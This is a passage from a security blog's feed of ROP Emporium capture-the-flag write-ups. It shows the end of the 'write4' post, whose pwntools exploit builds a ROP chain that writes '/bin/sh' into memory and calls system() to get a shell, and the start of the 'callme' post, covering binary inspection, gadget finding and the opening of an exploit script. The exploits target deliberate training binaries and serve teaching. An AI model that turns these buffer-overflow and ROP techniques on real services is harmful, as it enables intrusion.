    &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Start the exploit against the target.'''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LOCAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''
break *0x{exe.symbols.main:x}
break *0x400890
break *0x400807
continue
'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;locals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;arbitrary_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#0x400890: pop r14; pop r15; ret;
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#0x400820: mov qword ptr [r14], r15; ret;
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop reg
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# mov to_reg, from_reg
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# address &amp;gt; data &amp;gt; pop r14; pop r15; mov
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pop_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400890&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mov_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400820&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# [0x00400650]&amp;gt; iS
# Nm Paddr Size Vaddr Memsz Perms Name
# 25 0x00001050 16 0x00601050 16 -rw- .data
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#0x400893: pop rdi; ret;
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4005e0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data_segment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x601050&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400893&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arbitrary_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/12/ropemporium-3-write4/image-2.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;GitHub: &lt;a href=&quot;https://github.com/Securitybits-io/ROPEmporium&quot;&gt;https://github.com/Securitybits-io/ROPEmporium&lt;/a&gt;&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="exploit-dev" /><summary type="html">Moving on to the 4th instalment of this series with Write4</summary></entry><entry><title type="html">ROPEmporium: 2-Callme (64-bit)</title><link href="/ropemporium-2-callme" rel="alternate" type="text/html" title="ROPEmporium: 2-Callme (64-bit)" /><published>2019-08-17T00:00:00+00:00</published><updated>2019-08-17T00:00:00+00:00</updated><id>/ropemporium-2-callme</id><content type="html" xml:base="/ropemporium-2-callme">&lt;blockquote&gt;
  &lt;p&gt;Continuing the ROP Series with Callme, this time going through Calling conventions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now if you haven’t caught on, this is a series! I went through a bit about calling parameters in the previous post &lt;a href=&quot;https://blog.securitybits.io/ropemporium-1-split-64-bit/&quot;&gt;1-Split&lt;/a&gt;, and in this post we’ll dig into it a bit more and make 3 consecutive calls with 3 specific parameters.&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;You must call &lt;strong&gt;callme_one(), callme_two()&lt;/strong&gt; and &lt;strong&gt;callme_three()&lt;/strong&gt; in that order, each with the arguments 1,2,3 e.g. &lt;strong&gt;callme_one(1,2,3)&lt;/strong&gt; to print the flag. The solution here is simple enough, use your knowledge about what resides in the PLT to call the callme_ functions in the above order and with the correct arguments.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;

&lt;p&gt;As usual lets download the correct archive and unzip it.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~/split# wget https://ropemporium.com/binary/callme.zip
root@linux:~/split# unzip callme.zip
root@linux:~/split# ls
callme callme.zip encrypted_flag.txt key1.dat key2.dat libcallme.so
root@linux:~/split# file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00e98079187631025159f040444e55bed3edcf1c, not stripped
root@linux:~/split# file libcallme.so
libcallme.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=4596d32e684288a4c3c8d3daf98fe6f42ffc4454, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Still not stripped, but we do get a bit more files, key1.dat, key2.dat, encrypted_flag.txt and libcallme.so. Again lets see what the callme binary wants for input data by executing it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;callme by ROP Emporium
64bits

Hope you read the instructions...
&amp;gt; inputdata

Exiting
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So according the instructions, to print the flag the ROP chain need to make the following function calls in the specific order.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+-------------------------------------------------------------+
| callme_one(1,2,3) + callme_two(1,2,3) + callme_three(1,2,3) |
+-------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So again, lets create the exploit template with pwntools, and add the 40-byte junk and payload definition. The 40-byte junk will be a constant in this series and for the ROPEmporium challenges. Although if you feel uncertain on how you identify the length of the buffer overflow, go back to &lt;a href=&quot;/2019/08/08/ropemporium-0-ret2win/&quot;&gt;0-ret2win&lt;/a&gt; as it will be the same procedure for this as well.&lt;/p&gt;

&lt;h2 id=&quot;radare2-reversing&quot;&gt;Radare2 Reversing&lt;/h2&gt;

&lt;p&gt;Now the description of the challenge claims that there should be little to no reversing at all, but for good practice lets have a look anyway.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Valkyrie:~/Documents/courses/ropemporium/2-callme# rabin2 -I callme
arch x86
baddr 0x400000
binsz 11375
bintype elf
bits 64
canary false
class ELF64
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto false
endian little
havecode true
intrp /lib64/ld-linux-x86-64.so.2
laddr 0x0
lang c
linenum true
lsyms true
machine AMD x86-64 architecture
maxopsz 16
minopsz 1
nx true
os linux
pcalign 0
pic false
relocs true
relro partial
rpath ./
sanitiz false
static false
stripped false
subsys linux
va true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Opening the binary up in radare2 and looking for the callme functions confirms that they are there, and with the symbols intact.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-2-callme/image-14.png&quot; alt=&quot;Radare2 Reversing&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That means we can use the pwntools symbols trick and in the exploit use &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exe.symbols.callme_one&lt;/code&gt;&lt;/em&gt; instead of direct memory addresses, making it a bit more readable.&lt;/p&gt;

&lt;h3 id=&quot;finding-gadgets&quot;&gt;Finding gadgets&lt;/h3&gt;

&lt;p&gt;Going back onto the precious blogpost where we exploited &lt;em&gt;1-split&lt;/em&gt; and the &lt;em&gt;x64_cheatsheet,&lt;/em&gt; we know that we need to put:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;0x1 in the RDI register (First parameter)&lt;/li&gt;
  &lt;li&gt;0x2 in the RSI register (Second parameter)&lt;/li&gt;
  &lt;li&gt;0x3 in the RDX register (Third Parameter)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So the first thing is to use ropper to list all the &lt;em&gt;pop&lt;/em&gt; gadgets, as the call &lt;em&gt;pop&lt;/em&gt; is used to put the address on top of the stack into the destination register&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-2-callme/image-15.png&quot; alt=&quot;Finding ROP Gadgets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Conveniently on the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00401ab0&lt;/code&gt; there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; pop rsi; pop rdx; ret;&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;final-exploit&quot;&gt;Final Exploit&lt;/h2&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Author: Christoffer.Claesson@Securitybits.io
#Blog: https://blog.securitybits.io/2019/08/17/ropemporium-2-callme-64-bit/
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'callme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Execute the target binary locally'''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Connect to the process on the remote host'''&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Start the exploit against the target.'''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LOCAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
